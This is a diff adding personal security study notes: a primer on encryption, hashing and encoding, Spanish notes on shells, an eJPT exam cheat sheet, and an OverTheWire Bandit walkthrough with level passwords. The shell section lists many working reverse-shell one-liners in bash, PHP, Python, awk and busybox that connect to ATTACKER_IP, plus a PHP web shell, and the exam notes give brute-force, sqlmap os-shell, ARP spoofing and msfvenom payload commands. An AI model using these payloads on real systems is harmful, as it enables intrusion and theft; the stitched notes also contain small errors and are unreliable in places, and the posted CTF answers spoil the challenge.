@@ -2063,3 +2063,792 @@ run_powershell_command()
 
 This example separates the SQL query and PowerShell command into functions and includes basic error handling.
 
+
+
+///////////////////
+
+
+🔐 Encryption
+
+Purpose: Secrecy
+
+    What it does: Transforms data into a format that only authorized parties can read.
+
+    Reversible: ✅ Yes (with the right key)
+
+    Example Use Case: Sending a confidential message over the internet.
+
+    Common Algorithms: AES, RSA, Blowfish
+
+    Example:
+
+        Plain: hello
+
+        Encrypted (with key): A1B2C3D4...
+
+Important: If someone has the key, they can decrypt and get the original message.
+🔢 Hashing
+
+Purpose: Data integrity
+
+    What it does: Maps data of arbitrary size to fixed-size values (hash).
+
+    Reversible: ❌ No (one-way function)
+
+    Example Use Case: Password storage, verifying file integrity.
+
+    Common Algorithms: SHA-256, MD5, bcrypt
+
+    Example:
+
+        Input: password123
+
+        Hash: ef92b778bafe... (can’t turn it back into password123)
+
+Bonus: Even a tiny change in the input gives a completely different hash (called the avalanche effect).
+🔤 Encoding
+
+Purpose: Data transformation for interoperability
+
+    What it does: Converts data into a different format using a scheme.
+
+    Reversible: ✅ Yes (no secret)
+
+    Example Use Case: Sending binary data over text-based protocols like email or URLs.
+
+    Common Schemes: Base64, URL encoding, ASCII
+
+    Example:
+
+        Text: hello
+
+        Base64: aGVsbG8=
+
+Important: Encoding is not about security—anyone can decode it.
+TL;DR:
+Feature	Encryption	Hashing	Encoding
+Reversible	✅ With key	❌ One-way	✅ Easily
+Purpose	Privacy	Integrity	Data format
+Secure?	✅ (with key)	✅ (one-way)	❌ (not for security)
+Use Case	Secure messages	Password storage	Data transmission
+
+
+
+## ¿Qué es una Shell?
+
+Una **shell** es un software que permite al usuario interactuar con el sistema operativo. Puede ser una interfaz gráfica, aunque usualmente es una **interfaz de línea de comandos (CLI)**, y su forma dependerá del sistema operativo del sistema objetivo.
+
+En **ciberseguridad**, el término suele referirse a una sesión de shell específica que un atacante utiliza al acceder a un sistema comprometido, permitiéndole ejecutar comandos y software. Esto posibilita al atacante llevar a cabo varias actividades:
+
+* **Control remoto del sistema:** permite ejecutar comandos o software en el sistema objetivo de forma remota.
+* **Escalada de privilegios:** si el acceso inicial es limitado, se pueden buscar formas de obtener permisos más altos o acceso administrativo.
+* **Exfiltración de datos:** tras conseguir acceso, el atacante puede leer y copiar datos sensibles.
+* **Persistencia y mantenimiento de acceso:** se pueden crear usuarios, guardar credenciales o instalar puertas traseras para mantener el acceso.
+* **Actividades post-explotación:** como desplegar malware, crear cuentas ocultas o eliminar información.
+* **Acceso a otros sistemas en la red:** utilizando la shell como punto de pivote para comprometer otros sistemas. A esto se le conoce como **pivoting**.
+
+---
+
+## Reverse Shell (Shell Reversa)
+
+Una **shell reversa**, también conocida como *connect-back shell*, es una técnica popular para obtener acceso a un sistema comprometido. En este caso, la conexión se inicia **desde el sistema víctima hacia la máquina del atacante**, lo que ayuda a **evadir firewalls y otras defensas de red**.
+
+### ¿Cómo funciona?
+
+#### 1. Establecer un listener con Netcat
+
+```bash
+nc -lvnp 443
+```
+
+* `-l`: escuchar conexiones.
+* `-v`: modo detallado (verbose).
+* `-n`: evita resolución DNS.
+* `-p 443`: usa el puerto 443 para escuchar conexiones (pueden usarse puertos comunes como 53, 80, 443 para evadir detección).
+
+#### 2. Ejecutar el payload de reverse shell
+
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
+```
+
+#### 3. Conexión establecida
+
+```bash
+attacker@attacker-system:~$ nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
+target@target-system:~$
+```
+
+---
+
+## Bind Shell (Shell de Enlace)
+
+Una **bind shell** escucha conexiones en un puerto del sistema comprometido, exponiendo una shell cuando un atacante se conecta a él. Se usa si el sistema víctima **no permite conexiones salientes**, aunque es menos común ya que necesita estar escuchando activamente (más fácil de detectar).
+
+### ¿Cómo funciona?
+
+#### 1. Establecer el bind shell en el objetivo
+
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
+```
+
+#### 2. El atacante se conecta
+
+```bash
+nc -nv TARGET_IP 8080
+```
+
+#### 3. Conexión establecida
+
+```bash
+attacker@attacker-system:~$ nc -nv 10.10.13.37 8080
+(UNKNOWN) [10.10.13.37] 8080 (http-alt) open
+target@target-system:~$
+```
+
+---
+
+## Shell Listeners (Escuchas de Shell)
+
+Como se ha visto, una **shell reversa** conecta desde el sistema comprometido hacia el atacante. Existen diversas herramientas para escuchar esa conexión y facilitar la interacción con la shell obtenida:
+
+### 🧠 Rlwrap
+
+```bash
+rlwrap nc -lvnp 443
+```
+
+Permite usar flechas y recordar comandos anteriores.
+
+### 🛡️ Ncat
+
+```bash
+ncat -lvnp 4444
+ncat --ssl -lvnp 4444
+```
+
+* `--ssl`: cifra la conexión.
+
+### 🔗 Socat
+
+```bash
+socat -d -d TCP-LISTEN:443 STDOUT
+```
+
+---
+
+## Shell Payloads
+
+### Bash
+
+```bash
+bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
+exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
+0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
+bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
+```
+
+### PHP
+
+```php
+php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
+```
+
+### Python
+
+```bash
+export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
+python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
+```
+
+### Otros
+
+#### Telnet
+
+```bash
+TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
+```
+
+#### AWK
+
+```bash
+awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+```
+
+#### BusyBox
+
+```bash
+busybox nc ATTACKER_IP 443 -e sh
+```
+
+---
+
+## Web Shell
+
+Una **web shell** es un script que se ejecuta en un servidor web comprometido para ejecutar comandos a través de este. Generalmente, se trata de archivos en PHP, ASP, JSP, etc.
+
+### Ejemplo simple en PHP
+
+```php
+<?php
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+```
+
+Se puede acceder mediante una URL como:
+
+```
+http://victima.com/uploads/shell.php?cmd=whoami
+```
+
+### Web Shells Populares
+
+* **p0wny-shell**: shell PHP minimalista con ejecución remota.
+* **b374k shell**: PHP shell con manejo de archivos y ejecución de comandos.
+* **c99 shell**: shell avanzada con múltiples funcionalidades.
+
+📚 Más información en: [https://www.r57shell.net/index.php](https://www.r57shell.net/index.php)
+
+
+Introducción
+Estas notas te ayudarán a completar tu examen para la certificación eJPT, esto es solo
+una guía y lo más importante es que hayas entendido previamente los conceptos
+necesarios para aprobar el examen.
+Enumeración
+fping
+fping -a -g {RANGO IP} 2>/dev/null
+ejemplo fping
+fping -a -g 10.10.10.0/8 2>/dev/null
+Nmap barrido de ping:
+nmap -sn 10.10.10.0/8 | grep -oP '(?<=Resultado de nmap para )[^ ]*'
+Enumeración de activos vivos
+Una vez hayamos encontrado los activos que están vivos, comenzamos a enumerar los
+puertos y servicios en cada uno de ellos.
+Nmap TCP - Escaneo Rápido
+Escaneamos los 1000 puertos TCP más utilizados, guardamos los resultados.
+nmap 10.10.10.10 -Pn -sC -sV --open -n -oN fast-tcp.nmap
+Nmap TCP - Escaneo Completo
+Escaneamos los 65.535 puertos TCP y guardamos los resultados.
+nmap 10.10.10.10 -p- -Pn -sC -sV --open -n -oN full-tcp.nmap
+Nmap UDP - Escaneo Rápido
+Escaneamos los 1000 puertos TCP más utilizados, guardamos los resultados.
+nmap 10.10.10.10 -sU -sV -Pn -n -oN fast-udp.nmap
+Tipos de escaneos
+-sS: Escaneo TCP SYN
+-sT: Escaneo TCP Connect
+-sU: Escaneo UDP
+-sn: Escaneo de descubrimiento con ping
+-sV: Información de la versión del servicio
+-sC: Ejecución de scripts por defecto
+-O: Información del sistema operativo
+Encontrar Vulnerabilidades Comunes
+Una vez realizados todos los escaneos e identificados los puertos abiertos en los
+activos, es hora de comprobar si algún servicio es vulnerable.
+Puertos comunes a revisar
+Puerto Protocolo
+21 FTP
+22 SSH
+23 TELNET
+25 SMTP
+53 DNS
+80 HTTP
+443 HTTPS
+110 POP3
+115 SFTP
+143 IMAP
+135 MSRPC
+137 NETBIOS
+138 NETBIOS
+139 NETBIOS
+445 SMB
+3306 MYSQL
+1433 MYSQL
+3389 RDP
+Uso de Nmap como escáner de vulnerabilidades ligero
+nmap -sV --script=vulners -v 10.10.10.1
+si no tiene instalado vulners, encuentralo aquí: https://github.com/vulnersCom/nmap-
+vulners
+nmap --script vuln --script-args=unsafe=1 -iL hosts.nmap
+-iL : Fichero con la lista de activos (uno por linea)
+Puerto 21 - Enumeración FTP
+A veces las pistas están aquí. Las versiones antiguas de FTP pueden ser vulnerables,
+comprueba siempre la versión. Busca el exploit usando Google / Searchsploit / Rapid7.
+Si encuentras alguna credencial, pruébala en SSH / página web de inicio de sesión /
+base de datos.
+Enumerar servicio de FTP con Nmap
+nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-
+backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $ip
+Todos los scripts de enumeración de FTP en Nmap
+nmap --script=ftp-* -p 21 10.10.10.1
+Conexión por FTP
+ftp 10.10.10.1
+ncftp 10.10.10.1
+Tip: Recuerda probar con la credenciales anonymous:anonymous y ftp:ftp
+Fuerza bruta a FTP con usuario conocido
+hydra -l $user -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.1:21
+medusa -h 10.10.10.1 -u $user -P /usr/share/wordlists/rockyou.txt -M ftp
+Enumerar usuario por FTP
+ftp-user-enum.pl -U users.txt -t 10.10.10.1
+ftp-user-enum.pl -M iu -U users.txt -t $ip
+Puedes encontrar el script aquí: https://pentestmonkey.net/tools/ftp-user-enum/ftp-
+user-enum-1.0.tar.gz
+Comandos útiles en FTP
+• put # Subir un archivo.
+• mput # Subir múltiples archivos.
+• mget # Descargar múltiples archivos.
+• get # Descargar un archivo.
+• ls # listar contenido directorio.
+• mget * # Descargar todo.
+• binary = # Modo de transferencia binaria.
+• ascii = # Modo de transferencia ASCII.
+Archivos de configuración FTP
+• ftpusers
+• ftp.conf
+• proftpd.conf
+Versiones de FTP vulnerables
+• ProFTPD-1.3.3c Backdoor
+• ProFTPD 1.3.5 Mod_Copy Command Execution
+• VSFTPD v2.3.4 Backdoor Command Execution
+Puerto 445 - Enumeración SMB
+Comprueba siempre SMB, es posible que tenga alguna vulnerabilidad de RCE. Recuerda
+utilizar searchsploit, o google para comprobar si existe algún exploit disponible para
+esa versión.
+Escanear servicio NETBIOS/SMB con Nmap
+nmap 192.168.1.0/24 -p 139,445 --open -oN smb.nmap
+Escanear servicio NETBIOS/SMB con enum4linux-ng
+enum4linux-ng.py 192.168.125.131
+Escanear servicio NETBIOS/SMB con nbtscan
+nbtscan -r 192.168.1.0/24
+Enumerar el hostname
+nmblookup -A 10.10.10.1
+Comprueba sesiones nulas
+smbmap -H 10.10.10.1
+rpcclient -U "" -N 10.10.10.1
+smbclient \\\\10.10.10.1\\recurso -N
+Si te da el error "protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED"
+smbclient -L //10.10.10.3/ --option='client min protocol=NT1'
+Listar recursos compartidos
+smbmap -H 10.10.1.1
+smbclient -L 10.10.10.1 -U <user>%<pwd
+echo exit | smbclient -L \\\\10.10.10.10
+nmap --script smb-enum-shares -p 139,445 10.10.10.10
+Scripts de vulnerabilidades SMB con Nmap
+nmap 10.10.10.10 --script smb-vuln* -p 139,445
+Versiones vulnerables
+• Windows NT, 2000, and XP (SMB1) - VULNERABLE: Null Sessions se crean por defecto
+• Windows 2003, and XP SP2 en adelante - NO VULNERABLE: Null Sessions no se crean por
+defecto
+• Samba (Unix) servers
+Lista de versiones de SMB y versiones de Windows correspondientes
+• SMB1 – Windows 2000, XP and Windows 2003.
+• SMB2 – Windows Vista SP1 and Windows 2008
+• SMB2.1 – Windows 7 and Windows 2008 R2
+• SMB3 – Windows 8 and Windows 2012.
+Puertos 80,443,8080 - Enumeración y Explotación de
+Aplicaciones Web
+Checklist de enumeración de aplicaciones web
+1. Comprueba toda la página web y lo que muestra.
+2. Lee cada página, busca correos electrónicos, nombres, información del usuario,
+etc.
+3. Descubrimiento de directorios (gobuster, dirb, ffuf, wfuzz)
+4. Enumera la aplicación, ¿cuál es el CMS y la versión? ¿Página de instalación del
+servidor? (wappalyzer, whatweb)
+5. Comprueba si hay posibles vulnerabilidades de LFI, RFI, inyección SQL, XXE y
+subida de archivos.
+6. Comprueba si hay una página por defecto, identifica la versión del servidor.
+7. Ver Código Fuente: a. Comprobar si hay valores ocultos b. Compruebe si hay
+comentarios/observaciones del desarrollador c. Comprobación de código extraño
+d. Comprobación de contraseñas
+8. Comprobar el archivo robots.txt
+9. Escaneo web
+VirtualHosting
+Es posible que el sitio web cargue unicamente desde un cierto dominio
+sudo vim /etc/hosts
+10.0.0.1 static.foobar.org
+Identificación de tecnologías/CMS
+Encuentra las tecnologías que utiliza el sitio web
+Wappalyzer
+Extensión para el navegador https://addons.mozilla.org/es/firefox/addon/wappalyzer/
+Whatweb
+whatweb http://10.10.10.11
+Certificado TLS/SSL
+Ver información sobre el certificado
+openssl s_client -connect target.site:443
+Descubrimiento de directorios/archivos
+Encuentra directorios y archivos que te pueden interesar
+gobuster dir -u 10.10.10.181 -w /usr/share/seclists/Discovery/Web-Content/common.txt -
+t 100
+Gobuster con top1000-robots
+wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-
+Content/Top1000-RobotsDisallowed.txt; gobuster -u http://10.10.10.10. -w Top1000-
+RobotsDisallowed.txt
+Gobuster Completo + User-Agent
+gobuster -s 200,204,301,302,307,403 -u 10.10.10.10 -w
+/usr/share/seclists/Discovery/Web_Content/big.txt -t 80 -a 'Mozilla/5.0 (X11; Linux
+x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'
+Gobuster archivos con extensiones
+gobuster -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 100
+-x txt,php
+ffuf busqueda de archivos
+ffuf -w wordlist.txt -u http://example.com/FUZZ -e .aspx,.php,.txt,.html
+Posibles extensiones
+Inyección SQL (Automatizada)
+sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz
+Comandos SQLmap
+Determina las bases de datos:
+sqlmap -u http://10.10.10.15/?id=4 --dbs
+Determina las tablas:
+sqlmap -u http://10.10.10.15/?id=4 -D dbname --tables
+imprime el contenido de la tabla:
+sqlmap -u http://10.10.10.15/?id=4 -D dbname -T table --dump
+intenta conseguir una shell:
+sqlmap -u http://10.10.10.15/?id=4 --os-shell
+XSS
+Intenta explotarla en campos de input provenientes de:
+Cabeceras de la petición
+Cookies
+Forumularios
+POST parametros
+GET parametros
+Prueba de XSS
+<script>alert(1)</script>
+<i>some text</i>
+Robo de cookies:
+<script>alert(document.cookie)</script>
+Puerto 3306 - MySQL
+Conectarse a una base de datos
+mysql --user=root --port=13306 -p -h 172.16.64.81
+SHOW databases; SHOW tables FROM databases; USE database; SELECT * FROM table;
+Cracking de Contraseñas
+Unshadow
+Si encuentras los archivos passwd y shadow podras convertirlos en un formato para john
+y crackear las contraseñas
+unshadow passwd shadow > unshadow
+John The Ripper
+john --wordlist=path/to/wordlist.txt path/to/hashes.txt
+Redes - Enrutamiento
+Te recomiendo que te sientas cómodo con los conceptos generales de redes y
+enrutamiento, incluyendo ser capaz de leer y entender archivos .PCAP.
+Enrutamiento IP y tablas de enrutamiento
+ip route - imprime la tabla de enrutamiento para el host en el que se encuentra
+ip route add RUTA_A via RUTA_DESDE - añadir una ruta a una nueva red si estás en una
+red conmutada y necesitas pivotar
+ARP Spoofing
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -i tap0 -t 10.10.10.10 -r 10.10.10.11
+SSH Tunneling / Port Forwarding
+local port forwarding
+el host de destino 192.168.0.100 está ejecutando un servicio en el puerto 8888 y desea
+que ese servicio esté disponible en el puerto 7777 de localhost
+ssh -L 7777:localhost:8888 user@192.168.0.100
+remote port forwarding
+estás ejecutando un servicio en localhost puerto 9999 y quieres que ese servicio esté
+disponible en el host de destino 192.168.0.100 puerto 12340
+ssh -R 12340:localhost:9999 user@192.168.0.100
+Local proxy through remote host
+Quieres enrutar el tráfico de red a través de un host remoto target.host así que creas
+un proxy socks local en el puerto 12001 y configuras los ajustes SOCKS5 a
+localhost:12001
+ssh -C2qTnN -D 12001 user@target.host
+DNS
+nslookup mysite.com
+dig mysite.com
+Metasploit
+Recomiendo que te familiarices con metasploit y meterpreter por si encuentras un RCE y
+quieres conseguir una shell.
+Comandos básicos msfconsole
+search x
+use x
+info
+show options, show advanced options
+SET X (e.g. set RHOST 10.10.10.10, set payload x)
+Ponerse a la escucha (listener)
+Interactivo
+msfconsole
+use exploit/multi/handler
+set payload <payload>
+set LHOST <local-ip>
+set LPORT <port>
+run
+Oneliner msfconsole -q -x "use exploit/multi/handler;set payload
+windows/x64/meterpreter_reverse_tcp;set lhost 10.0.0.1;set lport 9001;run"
+Comandos útiles Meterpreter (reverse shell)
+background
+sessions -l
+sessions -i 1
+sysinfo, ifconfig, route, getuid
+getsystem (privesc)
+bypassuac
+download x /root/
+upload x C:\\Windows
+shell
+use post/windows/gather/hashdump
+Msfvenom
+Generación de payloads
+Windows msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.10.10
+LPORT=9001 -f exe -o reverse.exe
+Linux msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=9001
+-f elf -o reverse.elf
+Reverse Shells
+Establecer una conexión inversa
+Máquina atacante
+nc -nlvp 443
+Máquina víctima
+Linux: nc <ip-atacante> -e /bin/bash
+Windows: nc <ip-atacante> -e cmd.exe
+Recurso: https://www.revshells.com/
+
+////////////////////////
+
+
+BANDIT0
+The goal of this level is for you to log into the game using SSH. The host to which you need to connect is bandit.labs.overthewire.org, on port 2220. The username is bandit0 and the password is bandit0. Once logged in, go to the Level 1 page to find out how to beat Level 1.
+
+ssh -p 2220 bandit0@bandit.labs.overthewire.org
+passw: bandit0
+
+----------------------------------------------------
+BANDIT LEVEL 0 → LEVEL 1
+The password for the next level is stored in a file called readme located in the home directory. Use this password to log into bandit1 using SSH. Whenever you find a password for a level, use SSH (on port 2220) to log into that level and continue the game.
+
+cat /home/bandit0/readme 
+The password you are looking for is: ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If
+
+----------------------------------------------------
+BANDIT LEVEL 1 → LEVEL 2
+The password for the next level is stored in a file called - located in the home directory
+
+ssh -p 2220 bandit1@bandit.labs.overthewire.org
+passw: ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If
+
+cat /home/bandit1/-
+263JGJPfgU6LtdEvgfWU1XP5yac29mFx
+
+----------------------------------------------------
+BANDIT LEVEL 2 → LEVEL 3
+The password for the next level is stored in a file called spaces in this filename located in the home directory
+
+ssh -p 2220 bandit2@bandit.labs.overthewire.org
+passwd: 263JGJPfgU6LtdEvgfWU1XP5yac29mFx
+
+cat /home/bandit2/spaces\ in\ this\ filename 
+MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx
+
+----------------------------------------------------
+BANDIT LEVEL 3 → LEVEL 4
+The password for the next level is stored in a hidden file in the inhere directory.
+
+ssh -p 2220 bandit3@bandit.labs.overthewire.org
+passwd: MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx
+
+cat /home/bandit3/inhere/...Hiding-From-You 
+2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ
+
+----------------------------------------------------
+BANDIT LEVEL 4 → LEVEL 5
+The password for the next level is stored in the only human-readable file in the inhere directory. Tip: if your terminal is messed up, try the “reset” command.
+
+ssh -p 2220 bandit4@bandit.labs.overthewire.org
+passwd: 2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ
+
+file ./-file07
+./-file07: ASCII text
+
+cat ./-file07
+4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw
+
+----------------------------------------------------
+BANDIT LEVEL 5 → LEVEL 6
+The password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties:
+
+    human-readable
+    1033 bytes in size
+    not executable
+    
+ssh -p 2220 bandit5@bandit.labs.overthewire.org
+passwd: 4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw
+
+
+bandit5@bandit:~/inhere$ find . -type f -size 1033c 2>/dev/null
+./maybehere07/.file2
+bandit5@bandit:~/inhere$ cat ./maybehere07/.file2
+HWasnPhtq9AVKe0dmk45nxy20cvUa6EG
+
+----------------------------------------------------
+BANDIT LEVEL 6 → LEVEL 7
+The password for the next level is stored somewhere on the server and has all of the following properties:
+
+    owned by user bandit7
+    owned by group bandit6
+    33 bytes in size
+    
+ssh -p 2220 bandit6@bandit.labs.overthewire.org
+passwd: HWasnPhtq9AVKe0dmk45nxy20cvUa6EG
+
+bandit6@bandit:~$ find / -type f -user bandit7 -group bandit6 -size 33c 2>/dev/null
+/var/lib/dpkg/info/bandit7.password
+bandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password
+morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj
+
+
+----------------------------------------------------
+BANDIT LEVEL 7 → LEVEL 8
+The password for the next level is stored in the file data.txt next to the word millionth
+
+ssh -p 2220 bandit7@bandit.labs.overthewire.org
+passwd: morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj
+
+
+dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc
+
+----------------------------------------------------
+BANDIT LEVEL 8 → LEVEL 9
+The password for the next level is stored in the file data.txt and is the only line of text that occurs only once
+
+ssh -p 2220 bandit8@bandit.labs.overthewire.org
+passwd: dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc
+
+bandit8@bandit:~$ sort data.txt | uniq -c | sort -n
+      1 4CKMh1JI91bUIZZPXDqGanal4xvAg0JM
+     10 0BKVRLEJQcpNx8wnSPxDLFnFKlQafKK6
+     10 0eJPctF8gK96ykGBBaKydhJgxSpTlJtz
+     10 0kJ7XHD4gVtNSZIpqyP1V45sfz9OBLFo
+     ....
+
+----------------------------------------------------
+BANDIT LEVEL 9 → LEVEL 10
+The password for the next level is stored in the file data.txt in one of the few human-readable strings, preceded by several ‘=’ characters.     
+
+ssh -p 2220 bandit9@bandit.labs.overthewire.org
+passwd: 4CKMh1JI91bUIZZPXDqGanal4xvAg0JM
+
+bandit9@bandit:~$ strings data.txt | grep "==="
+}========== the
+3JprD========== passwordi
+~fDV3========== is
+D9========== FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey
+
+----------------------------------------------------
+BANDIT LEVEL 10 → LEVEL 11
+The password for the next level is stored in the file data.txt, which contains base64 encoded data
+
+ssh -p 2220 bandit10@bandit.labs.overthewire.org
+passwd: FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey
+
+bandit10@bandit:~$ cat data.txt | base64 -d       (decode)
+The password is dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr
+
+bandit10@bandit:~$ echo -n "The password is dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr" | base64    (encode)
+VGhlIHBhc3N3b3JkIGlzIGR0UjE3M2ZaS2IwUlJzREZTR3NnMlJXbnBOVmozcVJy
+
+
+-------------------------------------------------------
+BANDIT LEVEL 11 → LEVEL 12
+The password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions
+
+ssh -p 2220 bandit11@bandit.labs.overthewire.org
+passwd: dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr
+
+bandit11@bandit:~$ cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+The password is 7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4
+
+
+--------------------------------------------------------
+BANDIT LEVEL 12 → LEVEL 13
+The password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work. Use mkdir with a hard to guess directory name. Or better, use the command “mktemp -d”. Then copy the datafile using cp, and rename it using mv (read the manpages!)
+
+
+ssh -p 2220 bandit12@bandit.labs.overthewire.org
+passwd: 7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4
+
+The password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. 
+00000000: 1f8b 0808 dfcd eb66 0203 6461 7461 322e  .......f..data2.
+00000010: 6269 6e00 013e 02c1 fd42 5a68 3931 4159  bin..>...BZh91AY
+00000020: 2653 59ca 83b2 c100 0017 7fff dff3 f4a7  &SY.............
+00000030: fc9f fefe f2f3 cffe f5ff ffdd bf7e 5bfe  .............~[.
+00000040: faff dfbe 97aa 6fff f0de edf7 b001 3b56  ......o.......;V
+00000050: 0400 0034 d000 0000 0069 a1a1 a000 0343  ...4.....i.....C
+00000060: 4686 4341 a680 068d 1a69 a0d0 0068 d1a0  F.CA.....i...h..
+00000070: 1906 1193 0433 5193 d4c6 5103 4646 9a34  .....3Q...Q.FF.4
+00000080: 0000 d320 0680 0003 264d 0346 8683 d21a  ... ....&M.F....
+00000090: 0686 8064 3400 0189 a683 4fd5 0190 001e  ...d4.....O.....
+000000a0: 9034 d188 0343 0e9a 0c40 69a0 0626 4686  .4...C...@i..&F.
+000000b0: 8340 0310 d340 3469 a680 6800 0006 8d0d  .@...@4i..h.....
+000000c0: 0068 0608 0d1a 64d3 469a 1a68 c9a6 8030  .h....d.F..h...0
+000000d0: 9a68 6801 8101 3204 012a ca60 51e8 1cac  .hh...2..*.`Q...
+000000e0: 532f 0b84 d4d0 5db8 4e88 e127 2921 4c8e  S/....].N..')!L.
+000000f0: b8e6 084c e5db 0835 ff85 4ffc 115a 0d0c  ...L...5..O..Z..
+00000100: c33d 6714 0121 5762 5e0c dbf1 aef9 b6a7  .=g..!Wb^.......
+00000110: 23a6 1d7b 0e06 4214 01dd d539 af76 f0b4  #..{..B....9.v..
+00000120: a22f 744a b61f a393 3c06 4e98 376f dc23  ./tJ....<.N.7o.#
+00000130: 45b1 5f23 0d8f 640b 3534 de29 4195 a7c6  E._#..d.54.)A...
+00000140: de0c 744f d408 4a51 dad3 e208 189b 0823  ..tO..JQ.......#
+00000150: 9fcc 9c81 e58c 9461 9dae ce4a 4284 1706  .......a...JB...
+00000160: 61a3 7f7d 1336 8322 cd59 e2b5 9f51 8d99  a..}.6.".Y...Q..
+00000170: c300 2a9d dd30 68f4 f9f6 7db6 93ea ed9a  ..*..0h...}.....
+00000180: dd7c 891a 1221 0926 97ea 6e05 9522 91f1  .|...!.&..n.."..
+00000190: 7bd3 0ba4 4719 6f37 0c36 0f61 02ae dea9  {...G.o7.6.a....
+000001a0: b52f fc46 9792 3898 b953 36c4 c247 ceb1  ./.F..8..S6..G..
+000001b0: 8a53 379f 4831 52a3 41e9 fa26 9d6c 28f4  .S7.H1R.A..&.l(.
+000001c0: 24ea e394 651d cb5c a96c d505 d986 da22  $...e..\.l....."
+000001d0: 47f4 d58b 589d 567a 920b 858e a95c 63c1  G...X.Vz.....\c.
+000001e0: 2509 612c 5364 8e7d 2402 808e 9b60 02b4  %.a,Sd.}$....`..
+000001f0: 13c7 be0a 1ae3 1400 4796 4370 efc0 9b43  ........G.Cp...C
+00000200: a4cb 882a 4aae 4b81 abf7 1c14 67f7 8a34  ...*J.K.....g..4
+00000210: 0867 e5b6 1df6 b0e8 8023 6d1c 416a 28d0  .g.......#m.Aj(.
+00000220: c460 1604 bba3 2e52 297d 8788 4e30 e1f9  .`.....R)}..N0..
+00000230: 2646 8f5d 3062 2628 c94e 904b 6754 3891  &F.]0b&(.N.KgT8.
+00000240: 421f 4a9f 9feb 2ec9 83e2 c20f fc5d c914  B.J..........]..
+00000250: e142 432a 0ecb 0459 1b15 923e 0200 00    .BC*...Y...>...
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+----------------------------------------------------
+----------------------------------------------------
+Useful toold installed on machines: 
+    * gef (https://github.com/hugsy/gef) in /opt/gef/
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
